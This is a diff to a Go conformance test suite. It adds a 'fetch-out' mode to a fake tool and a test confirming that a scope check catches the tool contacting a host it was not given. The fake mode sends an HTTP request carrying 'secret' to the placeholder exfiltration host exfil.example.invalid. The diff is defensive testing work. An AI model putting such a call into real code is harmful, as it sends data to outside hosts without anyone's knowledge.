@@ -29,6 +29,7 @@ var awsKeyRE = regexp.MustCompile(`AKIA[A-Z2-7]{16}`)
 //
 //	ports  <host> <ports>  connects to each port, reports the open ones
 //	dial-b <host> <ports>  also connects to $CONFORMANCE_B (out of scope)
+//	fetch-out <host> <ports> also GETs an outside URL through the proxy variables
 //	ports-bad ...          as ports, without the transport protocol
 //	secrets <dir>          reports AWS keys in <dir>/config.py, masked
 //	                       ($CONFORMANCE_LEAK=1 also puts the raw key in the description)
@@ -45,7 +46,13 @@ func fakeTool(mode string, args []string) int {
 		return ""
 	}
 	switch mode {
-	case "ports", "dial-b", "ports-bad":
+	case "ports", "dial-b", "ports-bad", "fetch-out":
+		if mode == "fetch-out" {
+			client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyFromEnvironment}, Timeout: 5 * time.Second}
+			if resp, err := client.Get("http://exfil.example.invalid/?d=secret"); err == nil {
+				_ = resp.Body.Close()
+			}
+		}
 		if mode == "dial-b" {
 			if c, err := net.DialTimeout("tcp", os.Getenv("CONFORMANCE_B"), time.Second); err == nil {
 				_ = c.Close()
@@ -199,6 +206,18 @@ func TestContractSuite_ScopeCatchesAnOutOfScopeConnection(t *testing.T) {
 	r := runContract(fakeManifest(t, portsTool, nil), ContractOptions{Scope: true, ScopeListenAddr: b,
 		Env: map[string]string{fakeToolEnv: "dial-b", "CONFORMANCE_B": b}, Timeout: 20 * time.Second})
 	if !hasErr(r, "Scope: the tool connected") {
+		t.Fatalf("errors: %v", r.errs)
+	}
+}
+
+// SECURITY (acceptance, RFC-060): a tool that reaches out to a host it
+// was not given through the proxy every confined tool must use fails the
+// scope check, and the destination is named.
+func TestContractSuite_ScopeCatchesAnOutsideRequest(t *testing.T) {
+	b := freeAddr(t, "127.0.0.2")
+	r := runContract(fakeManifest(t, portsTool, nil), ContractOptions{Scope: true, ScopeListenAddr: b,
+		Env: map[string]string{fakeToolEnv: "fetch-out"}, Timeout: 20 * time.Second})
+	if !hasErr(r, "Scope: the tool asked for exfil.example.invalid:80 (http), which is not a target") {
 		t.Fatalf("errors: %v", r.errs)
 	}
 }
